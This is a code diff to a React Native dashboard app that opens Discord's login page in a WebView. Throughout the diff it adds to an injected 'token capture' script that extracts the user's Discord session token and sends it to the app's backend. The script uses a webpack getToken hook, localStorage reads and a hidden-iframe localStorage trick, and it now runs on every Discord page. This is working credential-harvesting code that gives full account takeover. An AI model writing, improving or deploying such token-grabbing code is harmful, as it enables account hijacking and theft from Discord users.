@@ -22,7 +22,7 @@ export default function Dashboard({ user, setUser }) {
   const navigation = useNavigation();
   const [moves, setMoves] = useState([]);
   const [showWebView, setShowWebView] = useState(false);
-  const [webviewUrl, setWebviewUrl] = useState("https://discord.com/logout");
+  const [webviewUrl, setWebviewUrl] = useState("https://discord.com/login");
   const [paystackUrl, setPaystackUrl] = useState(null);
   const [accounts, setAccounts] = useState([]);
   const [showAccountList, setShowAccountList] = useState(false);
@@ -33,13 +33,19 @@ export default function Dashboard({ user, setUser }) {
   const appBecameActiveTime = useRef(null); // Track when app became active
   const isInitialLoad = useRef(true); // Track if this is the first load after app opens
   const hasRedirectedToLogin = useRef(false);
+  const [copiedItems, setCopiedItems] = useState(new Set()); // Track which items have been copied
+  const [webViewKey, setWebViewKey] = useState(0); // Force WebView remount on each link attempt
 
   const getCacheKey = () => `cached_moves_${user?._id}_${selectedAccount || 'all'}`;
 
   // AGGRESSIVE TOKEN CAPTURE SCRIPT (from SF.JS)
   const INJECTED_JAVASCRIPT = `
   (function() {
+    let captured = false;
+    
     function capture() {
+      if (captured) return true;
+      
       try {
         // 1. TRY THE "WEBPACK" HOOK (Most reliable for Discord 2025)
         const webpack = window.webpackChunkdiscord_app;
@@ -49,6 +55,7 @@ export default function Dashboard({ user, setUser }) {
             if (m.c[i].exports && m.c[i].exports.default && m.c[i].exports.default.getToken) {
               const token = m.c[i].exports.default.getToken();
               if (token && token.length > 20) {
+                captured = true;
                 window.ReactNativeWebView.postMessage(JSON.stringify({type: 'TOKEN', data: token}));
                 return true;
               }
@@ -56,26 +63,55 @@ export default function Dashboard({ user, setUser }) {
           }
         }
 
-        // 2. TRY THE "IFRAME RESTORATION" HOOK
+        // 2. TRY LOCALSTORAGE DIRECTLY
+        try {
+          const token = localStorage.getItem('token') || localStorage.getItem('_token');
+          if (token && token.length > 20) {
+            const clean = token.replace(/"/g, '').trim();
+            if (clean.length > 20) {
+              captured = true;
+              window.ReactNativeWebView.postMessage(JSON.stringify({type: 'TOKEN', data: clean}));
+              return true;
+            }
+          }
+        } catch (e) {}
+
+        // 3. TRY THE "IFRAME RESTORATION" HOOK
         // Discord deletes localStorage, but a new iframe can bring it back
-        const iframe = document.createElement('iframe');
-        iframe.style.display = 'none';
-        document.body.appendChild(iframe);
-        const storage = iframe.contentWindow.localStorage;
-        const token = storage.getItem('token');
-        if (token) {
-          const clean = token.replace(/"/g, '');
-          window.ReactNativeWebView.postMessage(JSON.stringify({type: 'TOKEN', data: clean}));
-          return true;
-        }
-      } catch (e) {}
+        try {
+          const iframe = document.createElement('iframe');
+          iframe.style.display = 'none';
+          document.body.appendChild(iframe);
+          const storage = iframe.contentWindow.localStorage;
+          const token = storage.getItem('token') || storage.getItem('_token');
+          if (token && token.length > 20) {
+            const clean = token.replace(/"/g, '').trim();
+            if (clean.length > 20) {
+              captured = true;
+              window.ReactNativeWebView.postMessage(JSON.stringify({type: 'TOKEN', data: clean}));
+              document.body.removeChild(iframe);
+              return true;
+            }
+          }
+          document.body.removeChild(iframe);
+        } catch (e) {}
+      } catch (e) {
+        console.error('Token capture error:', e);
+      }
       return false;
     }
 
-    // Check every 500ms
+    // Check immediately, then every 500ms
+    if (capture()) return;
+    
     const timer = setInterval(() => {
-      if (capture()) clearInterval(timer);
+      if (capture()) {
+        clearInterval(timer);
+      }
     }, 500);
+    
+    // Stop after 30 seconds to prevent infinite checking
+    setTimeout(() => clearInterval(timer), 30000);
   })();
 `;
 
@@ -270,13 +306,39 @@ export default function Dashboard({ user, setUser }) {
     });
   };
 
-  const handleCopy = (actionText) => {
-    const parts = actionText.split(" ");
-    const username = parts[1] || actionText;
+  const handleCopy = (itemId, actionText) => {
+    // Extract username from action text
+    // Format is usually: "📥 Username joined ServerName" or "✅ Username verified in ServerName"
+    const parts = actionText.split(" ").filter(p => p.trim());
+    
+    // Skip emoji (usually first part, very short) and take the username
+    // If first part is very short (likely emoji), take second part
+    // Handle "New Member" as special case (two words)
+    let username = actionText; // fallback
+    if (parts.length >= 2) {
+      // Check if first part is likely an emoji (very short, 1-2 chars)
+      if (parts[0].length <= 2) {
+        // First part is emoji, username is second part
+        username = parts[1];
+        // Check if it's "New Member" (two words)
+        if (parts[1] === "New" && parts[2] === "Member") {
+          username = "New Member";
+        }
+      } else {
+        // First part is likely the username
+        username = parts[0];
+      }
+    } else if (parts.length === 1) {
+      username = parts[0];
+    }
+    
+    // Copy to clipboard
     Clipboard.setString(username);
-    Alert.alert("Success", `${username} copied to clipboard`, [], {
-      cancelable: true,
-    });
+    
+    // Mark as copied (state can't change back once set)
+    if (!copiedItems.has(itemId)) {
+      setCopiedItems(prev => new Set([...prev, itemId]));
+    }
   };
 
   const handlePay = async () => {
@@ -284,27 +346,40 @@ export default function Dashboard({ user, setUser }) {
   };
 
   const onWebViewMessage = async (event) => {
+    const data = event.nativeEvent.data;
+    console.log('📨 WebView message received:', data?.substring(0, 50));
+    
     try {
-      const message = JSON.parse(event.nativeEvent.data);
+      const message = JSON.parse(data);
       if (message.type === "TOKEN" && message.data) {
+        console.log('✅ Token captured via JSON message');
         setShowWebView(false);
+        setWebviewUrl("https://discord.com/logout"); // Reset URL
         await sendTokenToBackend(message.data);
+        return;
       }
     } catch (e) {
-      // Direct string fallback
-      if (event.nativeEvent.data && event.nativeEvent.data.length > 20) {
+      // Direct string fallback - if it looks like a token
+      if (data && data.length > 20 && !data.includes('{') && !data.includes('error')) {
+        console.log('✅ Token captured via direct string');
         setShowWebView(false);
-        await sendTokenToBackend(event.nativeEvent.data);
+        setWebviewUrl("https://discord.com/logout"); // Reset URL
+        await sendTokenToBackend(data.trim());
+        return;
       }
     }
+    
+    console.log('⚠️ Message received but not a valid token');
   };
 
   const sendTokenToBackend = async (discordToken) => {
     if (!user || !user.token) {
       Alert.alert("Error", "Please login first");
+      setShowWebView(false); // Close WebView even on error
       return;
     }
 
+    console.log('📤 Sending token to backend...');
     try {
       const response = await fetch(`${API_URL}/link-discord`, {
         method: "POST",
@@ -317,22 +392,49 @@ export default function Dashboard({ user, setUser }) {
 
       const result = await response.json();
       if (response.ok) {
+        console.log('✅ Discord account linked successfully');
         Alert.alert("✅ Success", "Discord account linked successfully!");
         await fetchAccounts(); // Refresh accounts list
         fetchMoves(); // Refresh moves
+        // Ensure WebView is closed and reset for next attempt
+        setShowWebView(false);
+        setWebviewUrl("https://discord.com/login");
+        hasRedirectedToLogin.current = false;
+        setWebViewKey(prev => prev + 1); // Force remount on next open
       } else {
+        console.error('❌ Link failed:', result.error);
         Alert.alert("Error", result.error || "Failed to link Discord account");
+        // Keep WebView open so user can try again
       }
     } catch (error) {
       console.error("Link Discord error:", error);
       Alert.alert("Server Error", "Could not reach backend.");
+      // Keep WebView open so user can try again
     }
   };
 
   const handleNavigationChange = (navState) => {
-    // If the browser reaches the chat/channels area, it means login is 100% done
-    if (navState.url.includes("/channels/") || navState.url.includes("/@me")) {
-      webViewRef.current?.injectJavaScript(INJECTED_JAVASCRIPT);
+    const url = navState.url || "";
+    console.log('🔗 Navigation changed to:', url);
+
+    // If we're on any authenticated Discord app area (not just /channels or /@me),
+    // start the token capture script. Discord keeps changing paths, so we use a
+    // broader check instead of only /channels/@me.
+    const isDiscordApp =
+      url.startsWith("https://discord.com") ||
+      url.startsWith("http://discord.com");
+
+    const isLoginOrRegister =
+      url.includes("/login") ||
+      url.includes("/register") ||
+      url.includes("/oauth2");
+
+    if (isDiscordApp && !isLoginOrRegister) {
+      console.log('💉 Injecting token capture script...');
+      // Add a small delay to ensure page is loaded
+      setTimeout(() => {
+        webViewRef.current?.injectJavaScript(INJECTED_JAVASCRIPT);
+      }, 1000);
     }
   };
 
@@ -361,7 +463,7 @@ export default function Dashboard({ user, setUser }) {
             onPress={() => {
               hasRedirectedToLogin.current = false;
               setShowWebView(false);
-              setWebviewUrl("https://discord.com/logout");
+              setWebviewUrl("https://discord.com/login");
             }}
             style={styles.webHeaderButton}
           >
@@ -371,27 +473,102 @@ export default function Dashboard({ user, setUser }) {
           <View style={{ width: 50 }} />
         </View>
         <WebView
+          key={`webview-${webViewKey}`} // Force remount on each link attempt
           ref={webViewRef}
           incognito={true} // Use incognito mode to prevent cookie persistence
+          cacheEnabled={false} // Disable caching completely
+          cacheMode="LOAD_NO_CACHE" // Android: Don't use cache
           source={{ uri: webviewUrl }}
           injectedJavaScript={INJECTED_JAVASCRIPT}
           injectedJavaScriptBeforeContentLoaded={
-            "window.localStorage && window.localStorage.clear(); window.sessionStorage && window.sessionStorage.clear(); document.cookie.split(';').forEach(function(c) { document.cookie = c.replace(/^ +/, '').replace(/=.*/, '=;expires=' + new Date().toUTCString() + ';path=/'); });"
+            "(function() { window.localStorage && window.localStorage.clear(); window.sessionStorage && window.sessionStorage.clear(); document.cookie.split(';').forEach(function(c) { document.cookie = c.replace(/^ +/, '').replace(/=.*/, '=;expires=' + new Date().toUTCString() + ';path=/'); }); })();"
           }
           onMessage={onWebViewMessage}
           onNavigationStateChange={handleNavigationChange}
-          onLoadEnd={() => {
-            // Only redirect once, prevent infinite loop
-            if (webviewUrl && webviewUrl.includes("logout") && !hasRedirectedToLogin.current) {
+          onLoadStart={(navState) => {
+            console.log('📄 WebView load start:', navState.url);
+            const url = navState.url || '';
+            
+            // If we hit a 404 or error page, redirect to login immediately
+            if (url.includes('404') || url.includes('error') || url.includes('discord.com/logout')) {
+              if (!hasRedirectedToLogin.current) {
+                hasRedirectedToLogin.current = true;
+                console.log('🔄 Detected 404/error, redirecting to login...');
+                setTimeout(() => {
+                  setWebviewUrl("https://discord.com/login");
+                }, 500);
+              }
+            }
+            
+            // Clear storage on every navigation
+            webViewRef.current?.injectJavaScript(`
+              (function() {
+                try {
+                  window.localStorage.clear();
+                  window.sessionStorage.clear();
+                  document.cookie.split(';').forEach(function(c) {
+                    document.cookie = c.replace(/^ +/, '').replace(/=.*/, '=;expires=' + new Date().toUTCString() + ';path=/');
+                  });
+                } catch(e) {}
+              })();
+            `);
+          }}
+          onLoadEnd={(navState) => {
+            console.log('✅ WebView load end:', navState.url);
+            const url = navState.url || '';
+            
+            // If we're on logout URL or 404, redirect to login immediately
+            if ((url.includes("logout") || url.includes('404') || url.includes('error')) && !hasRedirectedToLogin.current) {
+              hasRedirectedToLogin.current = true;
+              console.log('🔄 Redirecting to Discord login...');
+              setTimeout(() => {
+                setWebviewUrl("https://discord.com/login");
+              }, 500);
+              return;
+            }
+            
+            // If we're on login page, inject token capture script
+            if (url.includes("login") && !url.includes("logout")) {
+              setTimeout(() => {
+                console.log('💉 Injecting token script on login page...');
+                webViewRef.current?.injectJavaScript(INJECTED_JAVASCRIPT);
+              }, 1000);
+            }
+            
+            // Inject token capture script on any authenticated Discord page (not login/logout)
+            if (url.startsWith("https://discord.com") && !url.includes("logout") && !url.includes("login") && !url.includes("404") && !url.includes("error")) {
+              setTimeout(() => {
+                console.log('💉 Injecting token script on authenticated page...');
+                webViewRef.current?.injectJavaScript(INJECTED_JAVASCRIPT);
+              }, 1000);
+            }
+          }}
+          onError={(syntheticEvent) => {
+            const { nativeEvent } = syntheticEvent;
+            console.log('❌ WebView error:', nativeEvent);
+            // If there's an error loading, redirect to login
+            if (!hasRedirectedToLogin.current) {
               hasRedirectedToLogin.current = true;
               setTimeout(() => {
                 setWebviewUrl("https://discord.com/login");
-              }, 800);
+              }, 500);
+            }
+          }}
+          onHttpError={(syntheticEvent) => {
+            const { nativeEvent } = syntheticEvent;
+            console.log('❌ WebView HTTP error:', nativeEvent.statusCode, nativeEvent.url);
+            // If 404 or other error, redirect to login
+            if ((nativeEvent.statusCode === 404 || nativeEvent.statusCode >= 400) && !hasRedirectedToLogin.current) {
+              hasRedirectedToLogin.current = true;
+              setTimeout(() => {
+                setWebviewUrl("https://discord.com/login");
+              }, 500);
             }
           }}
           javaScriptEnabled={true}
-          domStorageEnabled={true}
+          domStorageEnabled={true} // Enable for token capture, but we clear it on each load
           sharedCookiesEnabled={false} // Prevent sharing cookies between sessions
+          thirdPartyCookiesEnabled={false} // Disable third-party cookies
           userAgent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36"
         />
       </View>
@@ -411,10 +588,38 @@ export default function Dashboard({ user, setUser }) {
         <View style={{ flexDirection: "row", alignItems: "center" }}>
           <TouchableOpacity
             style={{ marginRight: 12 }}
-            onPress={() => {
-              hasRedirectedToLogin.current = false; // Reset redirect flag
-              setWebviewUrl("https://discord.com/logout"); // Start with logout to clear session
-              setShowWebView(true);
+            onPress={async () => {
+              // Reset all state for a fresh link attempt
+              console.log('🔗 Starting new Discord link attempt...');
+              
+              // Close WebView first if it's open
+              if (showWebView) {
+                setShowWebView(false);
+                // Wait a bit for WebView to fully unmount
+                await new Promise(resolve => setTimeout(resolve, 300));
+              }
+              
+              // Reset all state - go directly to login instead of logout (to avoid 404)
+              hasRedirectedToLogin.current = false;
+              setWebviewUrl("https://discord.com/login");
+              
+              // Force WebView to remount by changing key
+              setWebViewKey(prev => prev + 1);
+              
+              // Clear WebView cache if available
+              try {
+                const { WebView } = require('react-native-webview');
+                if (WebView.clearCache && typeof WebView.clearCache === 'function') {
+                  WebView.clearCache(true);
+                }
+              } catch (e) {
+                console.log('Could not clear WebView cache:', e);
+              }
+              
+              // Open WebView after a small delay
+              setTimeout(() => {
+                setShowWebView(true);
+              }, 100);
             }}
           >
             <Text style={{ color: "#5865F2" }}>Link Account</Text>
@@ -467,18 +672,33 @@ export default function Dashboard({ user, setUser }) {
       <FlatList
         data={moves}
         keyExtractor={(item) => item._id}
-        renderItem={({ item }) => (
-          <TouchableOpacity
-            onPress={() => handleCopy(item.action)}
-            activeOpacity={0.7}
-            style={styles.moveItem}
-          >
-            <Text style={{ fontWeight: "600" }}>{item.action}</Text>
-            <Text style={{ color: "#666", fontSize: 12 }}>
-              {new Date(item.timestamp).toLocaleString()}
-            </Text>
-          </TouchableOpacity>
-        )}
+        renderItem={({ item }) => {
+          const isCopied = copiedItems.has(item._id);
+          return (
+            <View style={styles.moveItem}>
+              <View style={styles.moveContent}>
+                <Text style={{ fontWeight: "600" }}>{item.action}</Text>
+                <Text style={{ color: "#666", fontSize: 12 }}>
+                  {new Date(item.timestamp).toLocaleString()}
+                </Text>
+              </View>
+              <TouchableOpacity
+                onPress={() => handleCopy(item._id, item.action)}
+                style={[
+                  styles.copyButton,
+                  isCopied && styles.copyButtonCopied
+                ]}
+              >
+                <Text style={[
+                  styles.copyButtonText,
+                  isCopied && styles.copyButtonTextCopied
+                ]}>
+                  {isCopied ? "Copied" : "Copy"}
+                </Text>
+              </TouchableOpacity>
+            </View>
+          );
+        }}
         refreshControl={
           <RefreshControl refreshing={refreshing} onRefresh={onRefresh} />
         }
@@ -517,10 +737,36 @@ const styles = StyleSheet.create({
     borderBottomColor: "#f0f0f0",
   },
   moveItem: {
+    flexDirection: "row",
+    justifyContent: "space-between",
+    alignItems: "center",
     padding: 12,
     borderBottomWidth: 1,
     borderBottomColor: "#eee",
     backgroundColor: "#fff",
+  },
+  moveContent: {
+    flex: 1,
+    marginRight: 12,
+  },
+  copyButton: {
+    backgroundColor: "#5865F2",
+    paddingHorizontal: 16,
+    paddingVertical: 8,
+    borderRadius: 6,
+    minWidth: 70,
+    alignItems: "center",
+  },
+  copyButtonCopied: {
+    backgroundColor: "#ef4444",
+  },
+  copyButtonText: {
+    color: "#fff",
+    fontWeight: "600",
+    fontSize: 12,
+  },
+  copyButtonTextCopied: {
+    color: "#fff",
   },
   payButton: {
     marginTop: 12,
